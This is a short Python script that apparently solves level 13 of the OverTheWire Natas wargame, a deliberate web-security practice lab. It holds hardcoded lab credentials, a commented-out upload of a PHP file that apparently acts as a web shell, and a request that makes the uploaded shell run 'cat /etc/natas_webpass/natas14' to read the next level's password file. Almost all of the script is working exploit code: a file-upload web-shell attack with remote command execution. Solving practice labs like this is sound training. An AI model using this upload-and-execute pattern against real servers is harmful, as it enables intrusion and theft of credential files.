import requests
import re
username = "natas13"
password = "lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9"
url = "http://%s.natas.labs.overthewire.org/" %username

session = requests.Session()
# response = session.post(url,files={"uploadedfile":open("hello.php","rb")},data={"filename":"hello.php","MAX_FILE_SIZE":"1000"},auth=(username,password))

response = session.get(url+"upload/osgyk2arun.php?c=cat /etc/natas_webpass/natas14",auth=(username,password))

print(response.text)